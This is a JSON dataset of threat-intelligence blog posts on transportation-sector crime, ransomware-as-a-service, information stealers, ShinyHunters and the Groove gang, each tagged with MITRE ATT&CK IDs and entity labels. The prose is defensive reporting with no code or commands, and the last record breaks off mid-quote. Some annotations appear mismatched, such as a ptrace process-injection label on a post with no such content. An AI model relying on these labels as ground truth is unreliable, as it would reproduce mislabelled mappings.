[{"cti_report": "How cybercriminals create turbulence for the transportation industry\nJul 14, 2021\nWhen you break down how transportation companies actually work, you can find yourself looking at nothing but supply chains.\nFrom moving people or goods from one place to another, keeping track of the vehicles that are transporting those people or goods, the third parties that are responsible for the maintenance and operations of those vehicles, along with a list of other business-critical functions, it\u2019s easy to see how these companies would need to lean heavily on internet-connected technology in order to be successful.\nHowever, since these companies are so reliant on the internet, they present a juicy target for the cybercrime underground.\nTransportation companies are constantly in the discussions on criminal forums, with nefarious actors attempting (and some succeeding) to attack companies\u2019 infrastructure along their supply chains for their own illegal gains.\nBelow are just some of the examples Intel 471 has observed when it comes to criminals going after transportation companies.\n### Access to Networks\nIntel 471 has [long tracked criminals](https://intel471.com/blog/ransomware-attack-access-merchants-infostealer-escrow-service) who specialize in selling access to compromised systems or stolen information.\nSome of those we have tracked have used their ability to target transportation companies as a way to stand out in the cybercrime underground.\nHere are some of the instances we have observed:\n* In November 2020, an Iranian-based actor advertised unauthorized access to a system belonging to an Iranian-based airline.\nThe actor shared a demonstration video which looked to be from an internal employee portal, which allowed people to access employee account numbers, national codes, passwords, payments, phone numbers, usernames and more.\nThe advertisement was shared on a popular Telegram channel dedicated to cybercrime, with over 19,000 members.\n* In January 2021, Intel 471 observed a well-known cybercriminal selling network access to a number of companies they allegedly pulled from malware logs.\nAmong the advertised access was a Citrix Gateway believed to be associated with a large, multinational aviation company.\nThe platform detailed access to another aviation company based in Scandinavia, mainly showcasing programs designed for training.\nThe actor is well-known for selling access to Citrix Gateways on various cybercriminal forums.\n* Also in January 2021, an actor offered to sell information on a remote code execution (RCE) vulnerability allegedly impacting a European-based cargo airline.\nThe actor sought US $150 for the information about the vulnerability that allegedly could be exploited to exfiltrate several internal documents and access login credentials.\nThe actor further claimed they also uploaded a web shell to the impacted server.\n### Gift Cards\nGift cards have long been a staple of the cybercrime underground, utilized by criminals as a way to move money.\nWhether it be physical cards or solely online credits, numerous transportation companies use gift cards as a way from customers to buy flights.\nThere are actors that have leveraged that ability for their own crimes.\n* One actor Intel 471 has tracked has been in the gift card fraud business since at least 2017.\nThe actor, who was previously engaged in selling compromised remote desktop protocol (RDP) credentials, bought ready-to-use gift cards from other actors, derived them from compromised accounts and sourced access from malware logs.\nThe companies the actor expressed interest in included three well-known airlines based in the United States, along with one multinational hotel chain.\nThe actor bought gift cards for half or a quarter of their value.\n* Another actor Intel 471 has tracked allegedly claimed to have a large number of digital gift cards issued by three well-known airlines based in the United States for sale each day.\nThe gift cards were not carded using compromised payment cards, but purchased with points from compromised accounts with rewards programs or cash-back services.\nThe actor primarily obtained credentials for such accounts from malware logs purchased on forums.\n### Ransomware\nRansomware is a top threat for all internet-connected businesses.\nThe transportation sector is no different.\nIntel 471 has observed numerous attacks on transportation-based organizations, including entities in both the public and private sector.\nThese incidents have all the hallmarks of a ransomware-as-a-service attack, with crews \u201crenting\u201d software to launch the attack, hundreds of gigabytes in data stolen, and calls for million-dollar ransom payments.\n* In March 2021, the operator or operators behind the NEFILIM ransomware-as-a-service affiliate program claimed the compromise of U.S.-based commercial airline Spirit Airlines, leaking 40GB of data with over 33,000 files.\n[According to open source reporting](https://www.suspectfile.com/florida-compagnia-aerea-spirit-airlines-nuovamente-colpita-da-un-data-breach/), Financial data and other personal information of customers who purchased tickets to fly with the airline between 2006 and 2021 were posted on a name-and-shame blog.\n* In April 2021, a group using the Mount Locker ransomware attacked the Santa Clara Valley Transportation Authority, stealing about 130 GB of corporate data.\nThe responsible parties are likely an offshoot of those who developed the ransomware, as the organization\u2019s data was posted on a name-and-shame blog operated by a different criminal group.\nIntel 471 also observed that the criminal crew applied a \u201cdouble extortion\u201d tactic by calling and threatening the victim\u2019s employees.\n### Conclusion\nTransportation companies are as dependent on technology as any other company.\nWith that trend likely to keep growing, is it imperative that these companies understand where their weak spots are when it comes to cybersecurity and how the cybercrime underground will exploit them if those weaknesses are left unchecked.\nKeys to a successful business often rely on the internet, just as cybercriminals rely on it to carry out their crimes.\nBy being proactive in assessing risk and closing vulnerabilities, transportation companies will prevent their technology stacks from being a target for the cybercrime underground.", "mitre_ids": ["T1195", "T1486", "T1190", "TA0010", "TA0006", "T1021", "T1486", "TA0010", "T1486", "T1486", "T1491", "T1486", "TA0010", "T1486"], "anno_name_label": [["MALWARE", "MountLocker"]], "cti_entity_class": ["CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE"]}, {"cti_report": "Three ways ransomware-as-a-service has become easier than ever to launch\nJul 28, 2021\nA big reason why ransomware has grown into such a large cybersecurity problem is because it\u2019s easy for criminals to get involved.\nWith promises of millions of dollars and very little threat of legal trouble, attacks are happening at a rate that is increasingly difficult for enterprises to keep up with.\nWhat makes it so easy for criminals to launch attacks is a combination of something we see in the everyday world: a growing base of people with technological know-how and a fine-tuned business model.\nThe cybercriminal underground is filled with people who have honed their skills in a short amount of time, studied where the security gaps are and learned what needs to be done in order to maximize profits.\nWith headlines showing that attackers are earning tens of millions of dollars, it\u2019s clear the underground has stumbled upon something that (unfortunately) works.\nWhile money and geopolitics play big roles, there are some other means that have allowed ransomware infections to proliferate with little resistance.\nEach one covered below can be seen in ransomware attacks that have occurred this year, proving that the cybercrime underground is quick to utilize methods that will ultimately lead to the largest payouts possible.\n### Ransomware code gets reused\nDevelopers in every area of development reuse code - it\u2019s a hallmark of the tradecraft.\nNo matter the language, you can find direct copies of the same code in everything from cellphones to construction equipment to cybersecurity products.\nFurthermore, code from past versions of software is built upon to make newer versions of software work better than ever before -- think about the difference in your smartphone\u2019s current operating system as compared to three years ago.\nIt can feel like it\u2019s light years beyond what it once was.\nThis practice is no different among the cybercrime underground.\nRansomware developers are fine-tuning the software to make it work as \u201cwell\u201d as it possibly can.\nAdditionally, criminal developers borrow code from different types of malware if the functions are relatively the same and it can help attacks be \u201csuccessful.\nOne such example lies in Babuk, the RaaS variant that was released as \u201copen source\u201d at the end of April.\nAfter the builder was posted on the internet in June, it was discovered that it generates pairs of encryption and decryption tools targeting Microsoft Windows systems, VMWare ESXi hypervisors and network-attached storage (NAS) units from both Intel x86 and ARM architectures.\nShortly thereafter lower-level actors took advantage of the builder, launching their own ransomware campaign outside of the Babuk affiliate program.\nIn late June, an operator using info-stealing malware Vidar issued \u201cdownload and execute\u201d tasks to bots, aimed to install the Babuk ransomware variant generated by the builder.\nAnother RaaS variant shows that malware code can be used interchangeably.\nIntel 471 has observed multiple similarities in the code between Conti ransomware and BazarLoader, malware that grants backdoor access to an infected Windows host.\nOne particular similarity is in the code that allows Conti to evade analysis in an isolated instance, such as a sandbox or virtual machine.\nThe code of this function is nearly identical to that used by the BazarLoader, with both functions following the exact logic and executing the same way when searching for hooks.\nWhile these examples are heavy on technical details, they essentially serve as building blocks for malware developers to easily build more efficient versions of ransomware, which in turn allow criminals to demand more money from ransomware victims.\n### Cybercriminals love those CVEs\nIt\u2019s a basic function of security teams, and yet it\u2019s one that causes quite a bit of consternation: the process around security patching.\nCybercriminals pay attention to CVEs as much as anyone else, knowing that organizations drag their feet in closing vulnerabilities that give criminals the access they need to carry out attacks with little struggle.\nYou can be sure that if you have read about a big vulnerability in the tech press, ransomware operators are aware of the news and will look to take advantage of it as soon as possible.\nFor instance, Intel 471 has observed the FiveHands ransomware crew looking to utilize vulnerabilities like a [SonicWall buffer overflow vulnerability](https://threatpost.com/sonicwall-botches-critical-vpn-bug/167152/) that wasn\u2019t patched correctly the first time it was uncovered, [a remote code execution vulnerability](https://us-cert.cisa.gov/ncas/current-activity/2021/07/13/vmware-releases-security-update) in VMware\u2019s vSphere Client that was pushed in May 2021, and the two vulnerabilities attached to Microsoft\u2019s [PrintNightmare problem](https://www.cnn.com/2021/07/07/tech/microsoft-security-update/index.html) that are still causing issues for organizations across the world.\nWe have not seen these vulnerabilities used in any attacks since being mentioned, but given the need to have access to the domain controller in order to launch a ransomware attack, it may not be long before the group leverages the vulnerability in order to lock an enterprise up for a hefty ransom.\n### Criminals Sell Their Service\nRansomware attacks have evolved to go beyond attackers just locking up an organization\u2019s technology stack and hoping it finds a way to pay up.\nNow attackers are looking to cause more problems via double extortion attacks, name-and-shame blogs, or DDoS attacks directed toward any public-facing assets that haven\u2019t been locked up by the initial ransomware attack.\nIn order for that to happen, RaaS gangs are working with other \u201cexperts\u201d in the cybercrime underground that specialize in various methods that can extend the life of a ransomware attack.\nIntel 471 observed one such actor working alongside the DarkSide ransomware gang until it shut down [following its attack on the Colonial Pipeline Co](https://edition.cnn.com/2021/06/04/politics/colonial-pipeline-ransomware-attack-password/index.html).in the United States.\nThe actor claimed to have launched DDoS attacks against DarkSide\u2019s victims for six weeks before the gang\u2019s shutdown.\nThe actor also claimed that 10 to 20 targets were under DDoS at any given time, with attacks lasting from one to 21 days.\nAccording to the actor, they earned US $500 to US $7,000 each time a victim paid a ransom.\nWhat\u2019s novel about this actor is they are unlikely to be a veteran of the cybercrime underground.\nThis person first surfaced on a well-known cybercrime forum in January 2021.\nOver a six month period, the person built enough reputation to latch onto one of the most notorious ransomware gangs in operation, profiting off the million-dollar ransoms DarkSide pulled in before disappearing.\nWhile this actor is new, they followed a model that is being replicated by a variety of actors that work in the cybercrime underground.\n### The solutions are actually pretty simple\nThe instances highlighted above are not the sole reason for the rise of ransomware attacks in 2021.\nBut attacks have moved far beyond sending a malicious link in an email and hoping for an errant click.\nBad actors have evolved to quickly learn how to maximize their impact in order to make a large amount of money.\nCybersecurity teams inside organizations must understand that being proactive about what the cybercrime underground is learning and how it's behaving can point them in the right direction of solutions for their security needs.", "mitre_ids": ["T1486", "T1486", "T1486", "T1486", "S0638", "T1486", "T1486", "T1486", "S0638", "S0638", "T1486", "T1105", "T1486", "S0575", "T1486", "S0534", "TA0003", "S0575", "T1497", "S0534", "T1486", "T1486", "T1486", "T1486", "S0618", "T1486", "T1190", "T1486", "T1486", "T1486", "T1499", "T1486", "T1499", "T1486", "T1486", "T1486", "T1486", "T1499", "T1499", "T1499", "T1499", "T1486", "T1486", "T1566"], "anno_name_label": [["MALWARE", "Vidar"], ["GROUP", "DarkSide"], ["GROUP", "DarkSide"], ["GROUP", "DarkSide"]], "cti_entity_class": ["CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI"]}, {"cti_report": "Here\u2019s how information stealers pose a threat beyond ransomware\nAug 18, 2021\nRansomware is a top threat that security teams should be tailoring their systems to defend against.\nBut in order to do so, they may need to look further than the ransomware itself.\nAnd by widening that scope, these teams may protect their enterprise beyond the damage that ransomware can cause.\nThe activity that Intel 471 analysts observe on the cybercrime underground has changed a bit with the rise of ransomware.\nMalware that has been used for traditional fraud schemes \u2014 particularly information stealers \u2014 has also been co-opted into the cycle of ransomware campaigns.\nWhile serving a reliable method for criminals to obtain credentials tied to financial accounts, they are now using information stealers to also go after corporate remote network login credentials, like virtual private networks (VPNs) or remote desktop software.\nA key thing to understand with regard to information stealers is that they all don\u2019t operate in the same way.\nThis malware class falls along a spectrum: there are some tried-and-true information stealers that have been in use for years, and some growing in popularity that have only been released in the past few weeks.\nSome versions may be solely dedicated to prying credentials away from your workforce, while others may give attackers modules that allow them to fine-tune their attack and possibly introduce longer-term attacks, like ransomware.\nOf the info stealers that Intel 471 tracks, about half are modular in nature.\nThose that have modular capabilities also give attackers a chance to do the following:\n* Intercept data entered into forms in the browser and send them to a malware control server (data exfiltration)\n* Install other software for malicious use, such as Cobalt Strike (for lateral movement)\n* Perform distributed denial of service (DDoS) attacks against different resources, such as a domain or IP address (website downtime)\n* Launch a \"stealth\" TeamViewer module that allows remote access to an infected machine (specific targeting)\n* Drop cryptominers that work to mine cryptocurrency such as Monero (steal computing resources)\nTaking the concept a bit further, criminals have also worked information stealers into bigger malware platforms.\nDespite efforts to [dismantle Trickbot\u2019s entire infrastructure](https://intel471.com/blog/trickbot-update-november-2020-bazar-loader-microsoft) in October 2020, We\u2019ve seen updated plug-ins that enable the infamous modular malware platform to handle web injections that look to siphon credentials.\nThe configuration has been issued to every Trickbot version still in use.\nAdditionally, we\u2019ve seen criminals use [malicious document builder EtterSilent](https://intel471.com/blog/ettersilent-maldoc-builder-macro-trickbot-qbot) to spread Trickbot, giving them yet another way to steal enterprise credentials.\nSome ransomware crews have looked to own their own \u201cbrand\u201d of information stealers in an attempt to build custom tools that can assist them with a number of different things, including ways to evade anti-malware products.\nIn October 2020, a known account on a well-known cybercrime forum linked to the REvil ransomware gang placed a bid for the source code to the KPOT info stealer.\nWhile Intel 471 cannot definitively say that the code was awarded to the account, it was the only bid placed and the auction was closed shortly thereafter.\nEven with the uptick in ransomware-related activity, Intel 471 is still observing criminals trying to use information stealers to gain access to people\u2019s bank accounts.\nWith mobile banking becoming increasingly prevalent, especially in the form of online-only banking, attackers have developed malware specifically targeting this form of financial services.\nWe\u2019ve observed actors advertising web injects that target a host of different banks, including those that specialize in online-only banking.\nFocusing strictly on the Android operating system, one actor claimed to have over web injections for 400 different banks.\nOther actors could purchase \u201cpacks\u201d of injects for $25, or purchase the entire library for $3,000.\nJust as criminals behind information stealers continue to update their wares, law enforcement continues to arrest those trying to use this malware.\nWhile law enforcement does what it can, it often does not move at the speed of technology.\nThose behind information stealers can cause your organization a world of pain before contact with police can be made.\nSo here\u2019s what your security team can do to defend itself against this type of malware:\n* **Identity and access management**: When it comes to information stealers, criminals are by-and-large looking for credentials.\nThe best way to defend against credential abuse is through the use of multi-factor authentication.\nWhether it is a hardware token, a mobile application, or some hybrid of the two, adding another level of verification to your organization\u2019s credentials can save you time, money and agony.\n* **Behavioral firewalls:** Even the best MFA plan isn\u2019t going to help if your employees come across a malicious attachment in a phishing email or a socially-engineered message on social media.\nLook into SPF/DKIM/DMARC for your email services and link shims to protect your workforce from spoofed domains.\n* **Inventory management:** Have an inventory of what network equipment, devices and software are being used on your systems.\nIf you are suddenly seeing logins from Apple devices, and you know that you are solely running Windows machines, it should send up a flag that something is amiss.\n* **Organizational buy-in:** To those not in the cybersecurity trenches, opting for convenience over security is going to be the default mindset.\nIt is upon you, your security team, and other leaders to find a way to institute a program that clicks with your workforce, while also allowing them to get their job done as efficiently as possible.\nWhile security teams may be laser-focused on preventing a ransomware attack causing a total lockdown of their IT systems, putting other forms of malware on the back burner could leave your enterprise with a serious security problem.\nInformation stealers provide a way for hackers of all skill-levels to steal materials that could cause irreparable damage to your organization.\nBe it a relative novice or a veteran crew, account takeovers still present a solid revenue stream for anyone who wants to engage in illegal activities, as well as being the key enabler of ransomware attacks.", "mitre_ids": ["T1486", "T1486", "T1486", "T1486", "T1486", "TA0006", "TA0006", "T1486", "TA0006", "TA0003", "TA0010", "S0154", "TA0008", "T1105", "T1499", "T1499", "TA0011", "T1496", "S0266", "T1189", "TA0006", "S0266", "S0266", "T1566", "TA0006", "T1486", "S0496", "T1486", "T1189", "T1566", "T1486", "T1486", "T1486"], "anno_name_label": [["TOOL", "EtterSilent"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["MALWARE", "KPOT"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE"]}, {"cti_report": "Here's how to guard your enterprise against ShinyHunters\nAug 23, 2021\nThere is a group in the cybercriminal underground that is trying to collect troves of enterprise data the same way that millions of gamers collect Pok\u00e9mon.\nSince surfacing in April 2020, the group \u2014 which refers to itself as ShinyHunters \u2014 has been behind some of the most notable data breaches that have been made public.\nThose include breaches of [Microsoft\u2019s GitHub account](https://threatpost.com/report-microsofts-github-account-gets-hacked/155587/), [photo editing app Pixlr](https://siliconangle.com/2021/01/20/shinyhunters-publishes-1-9m-stolen-user-credentials-photo-editing-site-pixlr/), and [men\u2019s clothing retailer Bonobos](https://www.bleepingcomputer.com/news/security/bonobos-clothing-store-suffers-a-data-breach-hacker-leaks-70gb-database/).\nIntel 471 has also observed them claiming responsibility for several other breaches, including incidents impacting a sports media company, a mobile travel platform, and a website that allows musical artists to find and book gigs.\nAs research was being conducted for this blog, the group claimed to be in possession of 70 million records with personally identifiable information that it took from telecom giant AT&T.\nWith figures estimating the average data breach this year is approximately $4.4 million, we can estimate that ShinyHunters has cost companies tens of millions of dollars in damages this year.\nPrimarily operating on Raid Forums, the collective\u2019s moniker and motivation can partly be derived from their avatar on social media and other forums: [a shiny Umbreon Pok\u00e9mon](https://twitter.com/sh\\_corp).\nAs Pok\u00e9mon players hunt and collect \u201cshiny\u201d characters in the game, ShinyHunters collects and resells user data.\nWhile the group\u2019s targets are spread across different economic sectors, the methods by which they are obtaining organizational data follow a consistent pattern.\nShinyHunters tries to obtain legitimate credentials, most likely for a company's cloud services.\nFrom there, the group will seek to target database infrastructure to gather PII to be resold on marketplaces for profit.\nIntel 471 has also observed ShinyHunters targeting DevOps personnel or GitHub repository companies in order to steal valid OAuth credentials.\nThese OAuth keys are used to access cloud infrastructure and bypass any two-factor authentication processes that are in place.\nBelow is a further breakdown of the courses of action (CoAs) the actor could take based on TTPs identified, including the most likely courses of action (MLCoA) and the most dangerous courses of action (MDCoA) that organizations could anticipate.\nMore MITRE ATT&CK mapping can be found at the end of this blog.\n![ShinyHunters](https://d39ec1uo9ktrut.cloudfront.net/ShinyHunters-blog-table-v1.png)\nIntel 471 has also observed the group follow TTPs in the MDCoA column, but then leverage the credentials in secondary or tertiary attacks.\nAdditionally, the group will also search a company's GitHub repository source code for vulnerabilities within the code itself.\nThese vulnerabilities are used in further, more complex, third-party or supply chain attacks.\nShinyHunters may not have as much notoriety as the ransomware groups that are currently causing havoc for enterprises all over the world.\nHowever, tracking actors like this are crucial to preventing your enterprise from being hit with such an attack.\nThe information ShinyHunters gathers is often turned around and sold on the same underground marketplaces where ransomware actors use it to launch their own attacks.\nIf enterprises can move to detect activity like ShinyHunters, they in turn can stop ransomware attacks before they are ever launched.\n**APPENDIX:**\n**MITRE ATT&CK Techniques**\n**Reconnaissance** [[TA0043](https://attack.mitre.org/tactics/TA0043/)]\n* Gather Victim Identity Information: Credentials [[T1589.001]](https://attack.mitre.org/techniques/T1589/001/) - Sold unauthorized access credentials containing PII.\n* Gather Victim Identity Information: Email Addresses [[T1589.002](https://attack.mitre.org/techniques/T1589/002/)] - Sold unauthorized access credentials containing PII.\n* Phishing for Information [[T1598](https://attack.mitre.org/techniques/T1598/)].\nConducted phishing attacks targeting Microsoft Office 365 corporate users to steal account credentials.\n**Initial Access** [[TA0001](https://attack.mitre.org/tactics/TA0001/)]\n* Phishing [[T1566](https://attack.mitre.org/techniques/T1566/)] - Conducted phishing attacks targeting Microsoft Office 365 corporate users to steal account credentials.\n* Valid Accounts: Domain Accounts [[T1078.002](https://attack.mitre.org/techniques/T1078/002/)], Sold unauthorized access credentials containing PII.\n* Valid Accounts: Cloud Accounts [[T1078.004](https://attack.mitre.org/techniques/T1078/004/)].\nUsed AWS keys to obtain further access to cloud services and subsequently dumped databases hosted through AWS.\n**Credential Access** [[TA0006](https://attack.mitre.org/tactics/TA0006)]\n* Steal Application Access Tokens [[T1528](https://attack.mitre.org/techniques/T1528)] - Leveraged stolen Amazon Web Services (AWS) keys.\n**Discovery** [[TA0007](https://attack.mitre.org/tactics/TA0007)]\n* Cloud Infrastructure Discovery [[T1580](https://attack.mitre.org/techniques/T1580)] - Reset passwords for accounts with access to the victim organization\u2019s GitHub software repository system and sought Amazon Web Services (AWS) keys.\n**Lateral Movement** [[TA0008](https://attack.mitre.org/tactics/TA0008)]\n* Exploitation of Remote Services [[T1210](https://attack.mitre.org/techniques/T1210)] - Searched GitHub repository for OAuth keys and used them to move laterally to a cloud service.\n* Software Deployment Tools [[T1072](https://attack.mitre.org/techniques/T1072)] - Used GitHub repository.\n**Collection** [[TA0009](https://attack.mitre.org/tactics/TA0009)]\n* Data from Cloud Storage Object [[T1530](https://attack.mitre.org/techniques/T1530)] - Used AWS keys to obtain further access to cloud services and subsequently dumped databases hosted through AWS.\n* Data from Information Repositories [[T1213](https://attack.mitre.org/techniques/T1213)].\nSearched GitHub repository for OAuth keys and used them to move laterally to a cloud service.\n**Exfiltration** [[TA0010](https://attack.mitre.org/tactics/TA0010)]\n* Exfiltration Over Web Service [[T1567](https://attack.mitre.org/techniques/T1567)].\nSearched GitHub repository for OAuth keys and used them to move laterally to a cloud service.", "mitre_ids": ["T1213", "T1078", "T1213", "T1195", "T1486", "T1486", "T1486", "TA0043", "T1589", "T1589", "T1589", "T1589", "T1598", "T1598", "TA0001", "T1566", "T1566", "T1078", "T1078", "T1078", "T1078", "TA0006", "T1528", "T1528", "TA0007", "T1580", "T1580", "TA0008", "T1210", "T1210", "T1072", "T1072", "TA0009", "T1530", "T1530", "T1213", "T1213", "TA0010", "T1567", "T1567"], "anno_name_label": [["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"], ["GROUP", "ShinyHunters"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI"]}, {"cti_report": "How Groove Gang is shaking up the Ransomware-as-a-Service market to empower affiliates\nSep 09, 2021\n*Authored by Max Kersten, John Fokker, Thibault Seret and Intel471*\n*This blog post also ran on [McAfee's Enterprise ATR blog](https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/how-groove-gang-is-shaking-up-the-ransomware-as-a-service-market-to-empower-affiliates/).*\n### Executive Summary\nMcAfee Enterprise ATR believes, with high confidence, that the Groove gang is associated with the Babuk gang, either as a former affiliate or subgroup.\nThese cybercriminals are happy to put aside previous Ransomware-as-a-Service hierarchies to focus on the ill-gotten gains to be made from controlling victim\u2019s networks, rather than the previous approach which prioritized control of the ransomware itself.\n### Introduction\nFor many years the world of Ransomware-as-a-Service (RaaS) was perceived as a somewhat hierarchical and structured organization.\nRansomware developers would advertise their RaaS program on forums and gracefully open up slots for affiliates to join their team to commit crime.\nThe RaaS admins would conduct interviews with potential affiliates to make sure they were skilled enough to participate.\nHistorically, i.e., with [CTB locker](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/advanced-threat-research/), the emphasis was on affiliates generating enough installs via a botnet, exploit kits or stolen credentials, but it has shifted in recent years to being able to penetrate and compromise a complete network using a variety of malicious and non-malicious tools.\nThis essentially changed the typical affiliate profile towards a highly-skilled pen-tester/sysadmin.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-1.png)\nRecruitment posting for CTB locker from 2014\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-2.png)\nRecruitment posting for REvil from 2020\n[Experts often describe](https://www.unodc.org/e4j/en/organized-crime/module-7/key-issues/hierarchical-model.html) the hierarchy of a conventional organized crime group as a pyramid structure.\nHistorically, La Cosa Nostra, drug cartels and outlaw motor gangs were organized in such a fashion.\nHowever, due to further professionalization and specialization of the logistics involved with committing crime, groups have evolved into more opportunistic network-based groups that will work together more fluidly, according to their current needs.\nWhile criminals collaborating in the world of cybercrime [isn\u2019t a new concept](https://research-information.bris.ac.uk/ws/portalfiles/portal/194364696/DEVIANT\\_SECURITY\\_EHAVANDESANDT.pdf), a RaaS group\u2019s hierarchy is more rigid compared to other forms of cybercrime, due to the power imbalance between the group\u2019s developers/admins and affiliates.\nFor a long time, RaaS admins and developers were prioritized as the top targets, often neglecting the affiliates since they were perceived as less-skilled.\nThis, combined with the lack of disruptions in the RaaS ecosystem, created an atmosphere where those lesser-skilled affiliates could thrive and grow into very competent cybercriminals.\nHowever, this growth isn\u2019t without consequences.\nRecently we have observed certain events that might be the beginning of a new chapter in the RaaS ecosystem.\n### Cracks in the RaaS model\nTrust in the cybercriminal underground is based on a few things, such as keeping your word and paying people what they deserve.\nJust like with legitimate jobs, when employees feel their contributions aren't adequately rewarded, those people start causing friction within the organization.\nRansomware has been generating billions of dollars in recent years and with revenue like that, it\u2019s only a matter of time before some individuals who believe they aren\u2019t getting their fair share become unhappy.\nRecently, a former Conti affiliate was unhappy with their financial portion and decided to disclose the complete Conti attack playbook and their Cobalt Strike infrastructure online, as shown in the screenshot below.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-3.png)\nDisgruntled Conti affiliate\nIn the past, ATR has been approached by individuals affiliated with certain RaaS groups expressing grudges with other RaaS members and admins, claiming they haven't been paid in time or that their share wasn't proportionate to the amount of work they put in.\nRecently, security researcher [Fabian Wosar](https://twitter.com/fwosar/status/1433050105872109576) opened a dedicated Jabber account for disgruntled cybercriminals to reach out anonymously and he stated that there was a high level of response.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-4.png)\nJabber group for unhappy threat actors\nMoreover, the popular cybercrime forums have banned ransomware actors from advertising since the Colonial Pipeline attack.\nNow, the groups no longer have a platform on which to actively recruit, show their seniority, offer escrow, have their binaries tested by moderators, or settle disputes.\nThe lack of visibility has made it harder for RaaS groups to establish or maintain credibility and will make it harder for RaaS developers to maintain their current top tier position in the underground.\n**Paying respects\u2026.\nRAMP Forum and Orange**\nAfter a turbulent shutdown of Babuk and the fallout from the Colonial Pipeline and Kaseya attacks, it seems that some of the ransomware-affiliated cybercriminals have found a home in a forum known as RAMP.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-5.png)\nA RAMP post authored by Orange, introducing Groove and explaining relationships\nThe above posting reads in full:\n> Orange\n> Hello, friends.\nI am happy to announce the first contest on Ramp.\n> Let\u2019s make it clear that we don\u2019t do anything without a reason, so at the end of the day, it\u2019s us who will benefit most from this contest :)\n> Here\u2019s the thing: besides my new projects and old, I have always had this unit called\n> GROOVE \u2014 I\u2019ve never revealed its name before and it\u2019s never been mentioned directly in the media, but it does exist \u2014 we\u2019re like Mossad (we are few and aren\u2019t hiring).\nIt\u2019s Groove whom the babuk ransomware needs to thank for its fame.\n> Groove rocks, and babuk stinks :)\n> Challenge: Using a PHP stack+MYSQL+Bootstrap, code a standard ransomware operators\u2019 blog in THE RUSSIAN LANGUAGE with the following pages:\n> 1) About us\n> The description of a group, which must be editable from the admin panel and use the same visual editor as our forum.\n> 2) Leaks.\n> No hidden blogs, just leaks.\n> Use standard display, just like other ransomware operators\u2019 blogs do.\n> 3) News\n> A news page; it must be possible to add and edit news via the admin panel.\n> We\u2019ll be accepting your submissions up to and including August 30.\n> Who will rate the entries and how.\n> There will be only one winner.\nI, Orange, will rate the usability and design of blogs.\nMRT will rate each entry\u2019s source code and its security.\nIn addition to USD 1k, the winner will most likely get a job in the RAMP team.\n> Now, for those of you who are interested in entirely different things:\n> 1) No, we are not with the Kazakh intelligence agency.\n> 2) Groove has never had a ransomware product, nor will that ever change.\n> 3) The babuk team doesn\u2019t exist.\nWe rented the ransomware from a coder who could not shoulder the responsibility, got too scared and decided to leave an error in the ESX builder \u2014 naturally, to give us a reason to chuck him out (his motives.Fxxx if I know)\n> babuk 2.0, which hit the headlines, is not to be taken seriously and must be regarded as nothing but a very stupid joke\n> 4) GROOVE is first and foremost an aggressive financially motivated criminal organization dealing in industrial espionage for about two years.\nRANSOMWARE is no more than an additional source of income.\nWe don\u2019t care who we work with and how.\nYou\u2019ve got money.\nWe\u2019re in\n>\nWhen analyzing RAMP and looking at the posting above from the main admin Orange, it\u2019s hard to ignore numerous references that are made: From the names chosen, to the avatar of Orange\u2019s profile, which happens to be a picture of a legitimate [cyber threat intelligence professional](https://www.linkedin.com/pulse/am-i-new-admin-cybercrime-forum-ramp-ayesha-prakash/?trackingId=JfErghio7yqQAJchZvNIiA==).\n### RAMP Ransom Anon Mark[et] Place\nRAMP was created in July 2021 by a threat actor TetyaSluha, who later changed their moniker to \u2018Orange.\nThis actor claimed the forum would specifically cater to other ransomware-related threat actors after they were ousted from major cybercrime forums for being too toxic, following the high-profile ransomware attacks against the Colonial Pipeline and Washington D.C.\u2019s Metropolitan Police Department in the spring of 2021.\nAt the time of the initial launch, Orange claimed the forum's name was a tribute to a now-defunct Russian-language underground drug marketplace, \u201cRussian Anonymous Marketplace,\u201d which was taken down by Russian law enforcement agencies in 2017.\nThe re-launched cybercrime forum's name now supposedly stands for \"Ransom Anon Mark[et] Place.\nThe forum was initially launched on the same TOR-based resource that previously hosted a name-and-shame blog operated by the Babuk ransomware gang and the Payload.bin marketplace of leaked corporate data.\nThe forum was later moved to a dedicated TOR-based resource and relaunched with a new layout and a revamped administrative team, where Orange acted as the admin, with other known actors MRT, 999 and KAJIT serving as moderators.\n### Why the name Orange.\nWhy the admin changed handles from TetyaSluha to Orange isn\u2019t 100 percent clear.\nHowever, looking back, the early days of RAMP provides us some evidence on who this person has been affiliated with.\nWe found a posting from where the names Orange and Darkside are mentioned as potential monikers.\nVery shortly after that, TetyaSluha changed their handle to Orange.\nWhile the initial message has been removed from the forum itself, the content was saved thanks to Intel 471.\n> **July 12**th* *2021 by Mnemo*\n> Congratulations on the successful beginning of struggle for the right to choose and not to be evicted.\nI hope, the community will soon fill with* 